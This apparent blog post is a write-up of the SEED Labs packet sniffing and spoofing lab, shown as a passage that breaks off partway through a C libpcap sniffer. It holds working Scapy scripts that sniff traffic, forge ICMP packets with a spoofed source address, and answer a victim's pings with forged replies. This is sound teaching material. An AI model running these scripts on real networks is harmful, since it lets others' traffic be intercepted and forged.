<!DOCTYPE html>
<html>
	<head>
		
<title>Packet Sniffing and Spoofing Lab-无限进步</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" type="image/x-icon" href="/image/shengdanwu.png">

<link rel="stylesheet" href="/css/index.css">



<meta name="keywords" content="网络安全,">
<meta name="description" content="Seedlabs2.0-Packet Sniffing and Spoofing Lab实验报告">


<script src="/js/jquery.min.js"></script>


<script src="/js/index.js"></script>


<script src="/js/fancybox.umd.js"></script>


<script src="/js/fancybox-images.js"></script>


<script src="/js/gitalk.min.js"></script>


<script src="/js/hljs.min.js"></script>
 
<script>hljs.highlightAll();</script>

	<meta name="generator" content="Hexo 8.1.1"></head>

	<body>
		
	<div class="header">
		<div class="header-top" id="header-top">
			<div class="h-left">
				<a href="/">
					<img src="/image/shengdanwu.png" alt="Quiet">
				</a>
			</div>
			<div class="h-right">
				<ul>
					
						
								<li>
									<a href="/">
										HOME
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/archives">
										ARCHIVE
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/categories">
										CATEGORIES
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/tags">
										TAGS
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/links">
										LINKS
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/about">
										ABOUT
									</a>
									<span class="dot"></span>
								</li>
								
									
				</ul>
			</div>
			<div class="h-right-close">
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
					<path fill="none" d="M0 0h24v24H0z" />
					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
				</svg>
			</div>
		</div>
	</div>
	<div class="sidebar">
    <div class="topo">
        <h2>Ram</h2>
    </div>
    <ul>
        
        <li>
            <a href="/">HOME</a>
        </li>
        
        <li>
            <a href="/archives">ARCHIVE</a>
        </li>
        
        <li>
            <a href="/categories">CATEGORIES</a>
        </li>
        
        <li>
            <a href="/tags">TAGS</a>
        </li>
        
        <li>
            <a href="/links">LINKS</a>
        </li>
        
        <li>
            <a href="/about">ABOUT</a>
        </li>
        
    </ul>
    <div class="my_foot">
        
        <a target="_blank" rel="noopener" href="https://github.com/RamBree">
            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
        </a>
        
    </div>
</div>
<div class='shelter'>
</div>
<style>
    .shelter{
        background-color: #333;
        opacity:0.5;
        cursor: pointer;
        display: none; 
        position: fixed;
        left: 0;
        top: 0; 
        right: 0;
        bottom: 0;
        z-index: 1998;
    }
    .sidebar {
        width: 66%;
        height: 100%;
        position: fixed;
        top: 0;
        right: -100%;
        bottom: 0;
        background: #fff;
        z-index: 1999;
        text-align: center;
        box-shadow: -6px 0 20px rgba(98, 94, 94, .815);
    }

    .topo {
        width: 100%;
        height: 200px;
        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
        background-size: 100% 100%;
        position: relative;
        display: flex;
        align-items: flex-end
    }

    .topo h2 {
        color: #fff;
        z-index: 1;
        position: relative;
        margin: 0 0 10px 10px;
        font-size: 1.2em;
        box-sizing: border-box
    }

    .topo:before {
        content: '';
        background-image: url(/image/pattern.png);
        background-repeat: repeat;
        height: 100%;
        left: 0;
        position: absolute;
        top: 0;
        width: 100%;
        z-index: 1
    }

    .sidebar ul {
        width: 100%;
        margin-top: 50px
    }

    .sidebar ul li {
        height: 50px;
        list-style: none;
        font-size: 1.2em;
        text-align: right;
        margin-right: 10px
    }

    .sidebar ul li a {
        display: grid;
        color: #5d606a;
        text-overflow: ellipsis;
        width: 100%;
        text-decoration: none
    }

    .my_foot {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        position: absolute;
        bottom: 0
    }

    .my_foot a {
        text-decoration: none;
        margin-right: 10px;
        display: inline-block
    }

    .my_foot a img {
        width: 30px;
        height: 30px
    }
</style>

<script>
    $( function () {
	$( '.h-right-close>svg' )
		.click( function () {
			$( '.sidebar' )
				.animate( {
					right: "0"
				}, 500 );
			$( '.shelter' )
				.fadeIn( "slow" )
		} );
	$( '.shelter' )
		.click( function ( e ) {
			$( '.sidebar' )
				.animate( {
					right: "-100%"
				}, 500 );
			$( '.shelter' )
				.fadeOut( "slow" )
		} )
} )

</script>

<div class="post">
    <div class="post-header-background post-header-color"
    style="background: url('')" 
>
    <div class="post-header-background-content">
        <ul class="post-header-tag">
            
            
            <li><a href="/tags/网络安全">网络安全</a></li>
            
            
        </ul>
        
        <h1>Packet Sniffing and Spoofing Lab</h1>
        <div class="post-header-info">
            <div class="post-header-info-author">
                
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20">
                        <g>
                            <path fill="#12183A"
                                d="M6.187 15.265A6.47 6.47 0 0 0 10 16.5a6.47 6.47 0 0 0 3.813-1.235A4.99 4.99 0 0 0 10 13.5a4.99 4.99 0 0 0-3.813 1.765zM5.082 14.25A6.485 6.485 0 0 1 10 12c1.965 0 3.726.872 4.918 2.25a6.5 6.5 0 1 0-9.836 0zM10 18a8 8 0 1 1 0-16 8 8 0 0 1 0 16zm0-7a3 3 0 1 1 0-6 3 3 0 0 1 0 6zm0-1.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3z">
                            </path>
                        </g>
                    </svg>
                
                <span class="post-header-info-author-text"> <a href="../../about">Ram</a></span>
                <div class="post-header-info-author-categories">
                    
                         <a href="/categories/SeedLabs2.0" target="_blank" >SeedLabs2.0</a>
                    
                </div>
                <p>2025-11-12 10:21:50</p>
            </div>
        </div>
    </div>
</div>
    <div class="post-content" id="content">
  
  <div id="article" class="post-content-info">
    
      <div id="post-toc">
        <span class="post-toc-title">文章目录</span>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Packet-Sniffing-and-Spoofing-Lab"><span class="toc-text">Packet Sniffing and Spoofing Lab</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets"><span class="toc-text">Lab Task Set 1: Using Scapy to Sniff and Spoof Packets</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-1-Sniffing-Packets"><span class="toc-text">Task 1.1: Sniffing Packets</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-1A"><span class="toc-text">Task 1.1A</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-1-1B"><span class="toc-text">Task 1.1B</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-2-Spoofing-ICMP-Packets"><span class="toc-text">Task 1.2: Spoofing ICMP Packets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-3-Traceroute"><span class="toc-text">Task 1.3: Traceroute</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-1-4-Sniffing-and-then-Spoofing"><span class="toc-text">Task 1.4: Sniffing and-then Spoofing</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets"><span class="toc-text">Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-1-Writing-Packet-Sniffing-Program"><span class="toc-text">Task 2.1: Writing Packet Sniffing Program</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-1A-Understanding-How-a-Sniffer-Works"><span class="toc-text">Task 2.1A: Understanding How a Sniffer Works</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-1B-Writing-Filters"><span class="toc-text">Task 2.1B: Writing Filters</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-1C-Sniffing-Passwords"><span class="toc-text">Task 2.1C: Sniffing Passwords.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-2-Spoofing"><span class="toc-text">Task 2.2: Spoofing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-2A-Write-a-spoofing-program"><span class="toc-text">Task 2.2A: Write a spoofing program.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Task-2-2B-Spoof-an-ICMP-Echo-Request"><span class="toc-text">Task 2.2B: Spoof an ICMP Echo Request.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Task-2-3-Sniff-and-then-Spoof"><span class="toc-text">Task 2.3: Sniff and then Spoof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
      </div>
    

    <h1 id="Packet-Sniffing-and-Spoofing-Lab"><a href="#Packet-Sniffing-and-Spoofing-Lab" class="headerlink" title="Packet Sniffing and Spoofing Lab"></a>Packet Sniffing and Spoofing Lab</h1><p>这个实验分为了两个大集合，可以选择其中一个完成。第一个是使用python不太需要编程基础，第二个是使用c语言，需要一定的编程基础。</p>
<p>实验环境如图所示。我们可以在容器内发起攻击，或者直接在虚拟机上发起攻击。</p>
<p><img src="/2025/11/12/seedlab6/image-20251113150342461.png" alt="image-20251113150342461"></p>
<p>虚拟机分配的网口信息。</p>
<p><img src="/2025/11/12/seedlab6/image-20251113151216139.png" alt="image-20251113151216139"></p>
<h1 id="Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets"><a href="#Lab-Task-Set-1-Using-Scapy-to-Sniff-and-Spoof-Packets" class="headerlink" title="Lab Task Set 1: Using Scapy to Sniff and Spoof Packets"></a>Lab Task Set 1: Using Scapy to Sniff and Spoof Packets</h1><p>主要使用了Python库中的<code>scapy</code>包。</p>
<h2 id="Task-1-1-Sniffing-Packets"><a href="#Task-1-1-Sniffing-Packets" class="headerlink" title="Task 1.1: Sniffing Packets"></a>Task 1.1: Sniffing Packets</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span><span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">print_pkt</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>
	pkt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>

pkt<span class="token operator">=</span>sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span><span class="token string">'br-b92e2c90b841'</span><span class="token punctuation">,</span><span class="token builtin">filter</span><span class="token operator">=</span><span class="token string">'icmp'</span><span class="token punctuation">,</span>prn<span class="token operator">=</span>print_pkt<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Task-1-1A"><a href="#Task-1-1A" class="headerlink" title="Task 1.1A"></a>Task 1.1A</h3><p>以root权限执行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ./sniffer.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们使用10.9.0.5的容器去ping我们的主机，接收到了报文，并且可以看见是从10.9.0.5发往10.9.0.1的报文。</p>
<p><img src="/2025/11/12/seedlab6/image-20251113152331999.png" alt="image-20251113152331999"></p>
<p>以seed权限运行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> seed
./sniffer.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>发现并没有权限执行。</p>
<p><img src="/2025/11/12/seedlab6/image-20251113152713257.png" alt="image-20251113152713257"></p>
<h3 id="Task-1-1B"><a href="#Task-1-1B" class="headerlink" title="Task 1.1B"></a>Task 1.1B</h3><p>针对三个任务，设计了不同的filter</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span><span class="token string">'br-b92e2c90b841'</span><span class="token punctuation">,</span><span class="token builtin">filter</span><span class="token operator">=</span><span class="token string">"icmp"</span><span class="token punctuation">,</span> prn<span class="token operator">=</span>print_pkt<span class="token punctuation">)</span>     <span class="token comment"># ICMP包</span>
sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span><span class="token string">'br-b92e2c90b841'</span><span class="token punctuation">,</span><span class="token builtin">filter</span><span class="token operator">=</span><span class="token string">"tcp and src host 8.8.8.8 and dst port 23"</span><span class="token punctuation">,</span> prn<span class="token operator">=</span>print_pkt<span class="token punctuation">)</span>  <span class="token comment"># 特定TCP包</span>
sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span><span class="token string">'br-b92e2c90b841'</span><span class="token punctuation">,</span><span class="token builtin">filter</span><span class="token operator">=</span><span class="token string">"net 128.230.0.0/16"</span><span class="token punctuation">,</span> prn<span class="token operator">=</span>print_pkt<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="Task-1-2-Spoofing-ICMP-Packets"><a href="#Task-1-2-Spoofing-ICMP-Packets" class="headerlink" title="Task 1.2: Spoofing ICMP Packets"></a>Task 1.2: Spoofing ICMP Packets</h2><p>我们的spoof代码如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
 
a<span class="token operator">=</span>IP<span class="token punctuation">(</span><span class="token punctuation">)</span>
a<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'182.61.200.110'</span>
a<span class="token punctuation">.</span>dst<span class="token operator">=</span><span class="token string">'10.9.0.5'</span>
b<span class="token operator">=</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token operator">=</span>a<span class="token operator">/</span>b
send<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2025/11/12/seedlab6/image-20251113154336575.png" alt="image-20251113154336575"></p>
<p>可以看到我们伪造<code>182.61.200.110</code>的主机向<code>10.9.0.5</code>发起了ICMP请求，10.9.0.5进行了ICMP回复</p>
<p><img src="/2025/11/12/seedlab6/image-20251113154517269.png" alt="image-20251113154517269"></p>
<h2 id="Task-1-3-Traceroute"><a href="#Task-1-3-Traceroute" class="headerlink" title="Task 1.3: Traceroute"></a>Task 1.3: Traceroute</h2><p>通过不断设置TTL来尝试</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span><span class="token operator">*</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	a<span class="token operator">=</span>IP<span class="token punctuation">(</span><span class="token punctuation">)</span>
	a<span class="token punctuation">.</span>dst<span class="token operator">=</span><span class="token string">'182.61.200.110'</span>
	a<span class="token punctuation">.</span>ttl<span class="token operator">=</span>i
	b<span class="token operator">=</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span>
	p<span class="token operator">=</span>a<span class="token operator">/</span>b
	send<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以看到当TTL&lt;7时，报文都是no response，而当TTL&gt;&#x3D;7时，服务器发回了返回报文。</p>
<p><img src="/2025/11/12/seedlab6/image-20251113164607491.png" alt="image-20251113164607491"></p>
<h2 id="Task-1-4-Sniffing-and-then-Spoofing"><a href="#Task-1-4-Sniffing-and-then-Spoofing" class="headerlink" title="Task 1.4: Sniffing and-then Spoofing"></a>Task 1.4: Sniffing and-then Spoofing</h2><p>攻击主机在10.9.0.1运行程序，该程序嗅探所有的icmp-echo报文，然后对发送ICMP回显的主机发送一个ICMP回显回复进行ICMP欺骗。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span><span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">spoof_pkt</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> ICMP <span class="token keyword">in</span> pkt <span class="token keyword">and</span> pkt<span class="token punctuation">[</span>ICMP<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span><span class="token number">8</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Orignal Packet......"</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Source IP:"</span><span class="token punctuation">,</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Destination IP:"</span><span class="token punctuation">,</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">)</span>
		
		ip<span class="token operator">=</span>IP<span class="token punctuation">(</span>src<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">,</span>dst<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">,</span>ihl<span class="token operator">=</span>pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>ihl<span class="token punctuation">)</span>
		icmp<span class="token operator">=</span>ICMP<span class="token punctuation">(</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">id</span><span class="token operator">=</span>pkt<span class="token punctuation">[</span>ICMP<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">,</span>seq<span class="token operator">=</span>pkt<span class="token punctuation">[</span>ICMP<span class="token punctuation">]</span><span class="token punctuation">.</span>seq<span class="token punctuation">)</span>
		data<span class="token operator">=</span>pkt<span class="token punctuation">[</span>Raw<span class="token punctuation">]</span><span class="token punctuation">.</span>load
		newpkt<span class="token operator">=</span>ip<span class="token operator">/</span>icmp<span class="token operator">/</span>data
		
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Spoofed Packet......"</span><span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Source IP:"</span><span class="token punctuation">,</span>newpkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Destination IP:"</span><span class="token punctuation">,</span>newpkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>dst<span class="token punctuation">)</span>
		
		send<span class="token punctuation">(</span>newpkt<span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

pkt<span class="token operator">=</span>sniff<span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token operator">=</span><span class="token string">'icmp[icmptype]=icmp-echo'</span><span class="token punctuation">,</span>prn<span class="token operator">=</span>spoof_pkt<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token number">1.2</span>.3.4     <span class="token comment"># a non-existing host on the Internet</span>
<span class="token function">ping</span> <span class="token number">10.9</span>.0.99   <span class="token comment"># a non-existing host on the LAN</span>
<span class="token function">ping</span> <span class="token number">8.8</span>.8.8     <span class="token comment"># an existing host on the Internet</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>运行程序之前，受害者主机测试，前两个ip主机ping不通，最后一个ip能够ping通。</p>
<p><img src="/2025/11/12/seedlab6/image-20251113165657803.png" alt="image-20251113165657803"></p>
<p>启动程序之后发现<code>1.2.3.4</code> 能够ping通，程序成功拦截并返回。位于LAN上的IP <code>10.9.0.99</code>，程序无法拦截，是因为它会发送ARP报文，但是程序没办法捕捉。<code>8.8.8.8</code>能够ping通，由于真实的服务器也会返回一个报文，所以容器中会接收到两份返回报文出现冗余。</p>
<p><img src="/2025/11/12/seedlab6/image-20251113170017862.png" alt="image-20251113170017862"></p>
<p>由于我们拦截了协议报文，受害者主机的IP router被我们修改了。</p>
<p><img src="/2025/11/12/seedlab6/image-20251113170321479.png" alt="image-20251113170321479"></p>
<h1 id="Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets"><a href="#Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets" class="headerlink" title="Lab Task Set 2: Writing Programs to Sniff and Spoof Packets"></a>Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</h1><p>主要用c语言中的pcap包来实现<a target="_blank" rel="noopener" href="http://www.tcpdump.org/pcap.htm.">pcap手册</a></p>
<h2 id="Task-2-1-Writing-Packet-Sniffing-Program"><a href="#Task-2-1-Writing-Packet-Sniffing-Program" class="headerlink" title="Task 2.1: Writing Packet Sniffing Program"></a>Task 2.1: Writing Packet Sniffing Program</h2><h3 id="Task-2-1A-Understanding-How-a-Sniffer-Works"><a href="#Task-2-1A-Understanding-How-a-Sniffer-Works" class="headerlink" title="Task 2.1A: Understanding How a Sniffer Works"></a>Task 2.1A: Understanding How a Sniffer Works</h3><p>设计一个sniffer程序，并完成源IP和目的IP的打印</p>
<p>根据手册的代码完成。实现了IP地址的打印。（不太会用这个pcap，用deepseek实现，比较粗糙）</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pcap.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;netinet/ip.h></span></span>

<span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> u_char<span class="token punctuation">;</span>
<span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">short</span> u_short<span class="token punctuation">;</span>

<span class="token comment">/* Ethernet header */</span>
<span class="token keyword">struct</span> <span class="token class-name">ethheader</span> <span class="token punctuation">&#123;</span>
    u_char  ether_dhost<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* destination host address */</span>
    u_char  ether_shost<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">/* source host address */</span>
    u_short ether_type<span class="token punctuation">;</span>        <span class="token comment">/* IP? ARP? RARP? etc */</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">got_packet</span><span class="token punctuation">(</span>u_char <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">pcap_pkthdr</span> <span class="token operator">*</span>header<span class="token punctuation">,</span> <span class="token keyword">const</span> u_char <span class="token operator">*</span>packet<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">struct</span> <span class="token class-name">ethheader</span> <span class="token operator">*</span>eth <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ethheader</span> <span class="token operator">*</span><span class="token punctuation">)</span>packet<span class="token punctuation">;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ntohs</span><span class="token punctuation">(</span>eth<span class="token operator">-></span>ether_type<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x0800</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 0x0800 is IP type</span>
        <span class="token keyword">struct</span> <span class="token class-name">ip</span> <span class="token operator">*</span>iphdr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ip</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>packet <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ethheader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Got a packet\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Source IP: %s\n"</span><span class="token punctuation">,</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span>iphdr<span class="token operator">-></span>ip_src<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Destination IP: %s\n"</span><span class="token punctuation">,</span> <span class="token function">inet_ntoa</span><span class="token punctuation">(</span>iphdr<span class="token operator">-></span>ip_dst<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Protocol: %d\n"</span><span class="token punctuation">,</span> iphdr<span class="token operator">-></span>ip_p<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">pcap_t</span> <span class="token operator">*</span>handle<span class="token punctuation">;</span>
    <span class="token keyword">char</span> errbuf<span class="token punctuation">[</span>PCAP_ERRBUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">bpf_program</span> fp<span class="token punctuation">;</span>
    <span class="token keyword">char</span> filter_exp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"icmp"</span><span class="token punctuation">;</span>
    bpf_u_int32 net<span class="token punctuation">;</span>
    
    <span class="token comment">// Step 1: Open live pcap session on NIC</span>
    handle <span class="token operator">=</span> <span class="token function">pcap_open_live</span><span class="token punctuation">(</span><span class="token string">"br-b92e2c90b841"</span><span class="token punctuation">,</span> BUFSIZ<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>handle <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't open device: %s\n"</span><span class="token punctuation">,</span> errbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// Step 2: Compile filter_exp into BPF pseudo-code</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pcap_compile</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fp<span class="token punctuation">,</span> filter_exp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> net<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Couldn't parse filter %s: %s\n"</span><span class="token punctuation">,</span> filter_exp<span class="token punctuation">,</span> <span class="token function">pcap_geterr</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token comment">// Step 3: Apply the filter</span>
